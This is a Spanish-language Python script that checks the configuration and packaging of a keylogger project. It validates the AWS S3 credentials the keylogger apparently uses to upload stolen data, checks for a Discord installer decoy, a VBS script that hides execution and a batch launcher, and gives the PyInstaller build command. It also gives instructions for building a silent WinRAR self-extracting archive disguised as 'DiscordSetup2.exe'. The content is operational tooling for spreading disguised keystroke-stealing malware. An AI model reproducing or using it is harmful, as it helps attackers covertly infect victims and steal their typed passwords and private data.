import os
import sys
from dotenv import load_dotenv

# Buscar .env en el directorio del ejecutable
if getattr(sys, 'frozen', False):
    # Si está ejecutándose como ejecutable empaquetado
    directorio_actual = os.path.dirname(sys.executable)
else:
    # Si está ejecutándose como script
    directorio_actual = os.path.dirname(os.path.abspath(__file__))

ruta_env = os.path.join(directorio_actual, '.env')

print(f"Directorio actual: {directorio_actual}")
print(f"Buscando .env en: {ruta_env}")
print(f"Archivo .env existe: {os.path.exists(ruta_env)}")
print()

load_dotenv(ruta_env)

# Configuración de AWS S3 (cargada desde variables de entorno)
S3_BUCKET = os.getenv("S3_BUCKET")
S3_FOLDER = os.getenv("S3_FOLDER", "")
S3_REGION = os.getenv("S3_REGION")
AWS_ACCESS_KEY_ID = os.getenv("AWS_ACCESS_KEY_ID")
AWS_SECRET_ACCESS_KEY = os.getenv("AWS_SECRET_ACCESS_KEY")

print("=" * 60)
print("CONFIGURACIÓN CARGADA:")
print("=" * 60)
print(f"S3_BUCKET: {S3_BUCKET if S3_BUCKET else '[NO CONFIGURADO]'}")
print(f"S3_FOLDER: {S3_FOLDER if S3_FOLDER else '[VACÍO - raíz del bucket]'}")
print(f"S3_REGION: {S3_REGION if S3_REGION else '[NO CONFIGURADO]'}")
print(f"AWS_ACCESS_KEY_ID: {'[CONFIGURADO - ' + AWS_ACCESS_KEY_ID[:10] + '...]' if AWS_ACCESS_KEY_ID else '[NO CONFIGURADO]'}")
print(f"AWS_SECRET_ACCESS_KEY: {'[CONFIGURADO]' if AWS_SECRET_ACCESS_KEY else '[NO CONFIGURADO]'}")
print("=" * 60)

# Validación
errores = []
if not S3_BUCKET:
    errores.append("❌ S3_BUCKET no configurado")
else:
    print("✓ S3_BUCKET configurado")

if not S3_REGION:
    errores.append("❌ S3_REGION no configurado")
else:
    print("✓ S3_REGION configurado")

if not AWS_ACCESS_KEY_ID:
    errores.append("❌ AWS_ACCESS_KEY_ID no configurado")
else:
    print("✓ AWS_ACCESS_KEY_ID configurado")

if not AWS_SECRET_ACCESS_KEY:
    errores.append("❌ AWS_SECRET_ACCESS_KEY no configurado")
else:
    print("✓ AWS_SECRET_ACCESS_KEY configurado")

print()

if errores:
    print("ERRORES ENCONTRADOS:")
    for error in errores:
        print(f"  {error}")
    print("\nACCIÓN REQUERIDA:")
    print("1. Verifica que el archivo .env esté en la misma carpeta que este script")
    print("2. Verifica que el contenido del .env tenga todas las variables")
else:
    print("✓✓✓ CONFIGURACIÓN CORRECTA ✓✓✓")
    print("\nPuedes proceder a empaquetar el ejecutable.")
    
    # Verificar archivos necesarios para empaquetar
    print("\n" + "=" * 60)
    print("ARCHIVOS QUE DEBES EMPAQUETAR CON WINRAR:")
    print("=" * 60)
    
    archivos_requeridos = [
        ('main.exe', '🔑 Keylogger ejecutable (generado con PyInstaller)'),
        ('.env', '⚙️  Configuración de AWS (CRÍTICO - mismo nivel que main.exe)'),
        ('DiscordSetup.exe', '🎭 Señuelo de Discord (distracción)'),
        ('ocultador.vbs', '👻 Script VBS para ocultar ejecución'),
        ('ejecuciones.bat', '🚀 Batch para ejecutar todo automáticamente')
    ]
    
    encontrados = 0
    no_encontrados = []
    
    for archivo, descripcion in archivos_requeridos:
        ruta_archivo = os.path.join(directorio_actual, archivo)
        existe = os.path.exists(ruta_archivo)
        
        if existe:
            tamano = os.path.getsize(ruta_archivo)
            if tamano > 1024 * 1024:  # Mayor a 1 MB
                tamano_str = f"{tamano / (1024*1024):.2f} MB"
            elif tamano > 1024:  # Mayor a 1 KB
                tamano_str = f"{tamano / 1024:.2f} KB"
            else:
                tamano_str = f"{tamano} bytes"
            
            print(f"  ✓ {archivo:25s} - {descripcion} [{tamano_str}]")
            encontrados += 1
        else:
            print(f"  ✗ {archivo:25s} - {descripcion} [NO ENCONTRADO]")
            no_encontrados.append(archivo)
    
    print("=" * 60)
    print(f"\nArchivos encontrados: {encontrados}/{len(archivos_requeridos)}")
    
    if no_encontrados:
        print("\n⚠️  ARCHIVOS FALTANTES:")
        for archivo in no_encontrados:
            if archivo == 'main.exe':
                print(f"  - {archivo}: Genera el ejecutable con PyInstaller:")
                print(f"      pyinstaller --onefile --noconsole --icon=Logo-DC.ico Keylogger.py")
            else:
                print(f"  - {archivo}: Debe estar en la carpeta raíz del proyecto")
    else:
        print("\n✓✓✓ TODOS LOS ARCHIVOS ESTÁN LISTOS ✓✓✓")
        print("\n📦 INSTRUCCIONES DE EMPAQUETADO:")
        print("   1. Selecciona TODOS los archivos listados arriba")
        print("   2. Click derecho → WinRAR → 'Crear archivo SFX'")
        print("   3. En 'Opciones SFX' → 'Configuración':")
        print("      - Ejecutar después de extraer: ejecuciones.bat")
        print("      - Modo silencioso: Ocultar todo")
        print("   4. Guarda como: DiscordSetup2.exe (o el nombre que prefieras)")
        print("\n⚠️  IMPORTANTE: El archivo .env DEBE estar al mismo nivel que main.exe")
        print("    cuando se extraiga, o el keylogger NO funcionará.")

input("\nPresiona Enter para salir...")
